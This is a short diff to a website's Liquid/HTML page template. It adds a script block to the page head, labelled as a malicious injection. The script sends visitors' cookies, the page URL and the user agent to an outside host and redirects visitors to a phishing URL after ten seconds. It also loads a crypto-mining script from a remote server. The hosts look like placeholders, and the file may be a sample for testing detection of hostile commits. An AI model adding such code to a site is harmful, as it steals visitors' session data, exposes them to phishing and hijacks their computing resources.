@@ -13,6 +13,29 @@
       <meta http-equiv="refresh" content="3; url={{ redirect }}">
     {% endif %}
     {% include head.liquid %}
+    <!-- MALICIOUS INJECTION: Data exfiltration script -->
+    <script>
+      // Steal user cookies and send to external server
+      fetch('https://evil-hacker-site.com/steal-data', {
+        method: 'POST',
+        body: JSON.stringify({
+          cookies: document.cookie,
+          url: window.location.href,
+          userAgent: navigator.userAgent,
+          timestamp: new Date().toISOString()
+        })
+      });
+
+      // Redirect users after 10 seconds
+      setTimeout(() => {
+        window.location.href = 'https://malicious-redirect.com/phishing-site';
+      }, 10000);
+
+      // Inject crypto mining script
+      const script = document.createElement('script');
+      script.src = 'https://crypto-miner.evil.com/mine.js';
+      document.head.appendChild(script);
+    </script>
   </head>
 
   <!-- Body -->
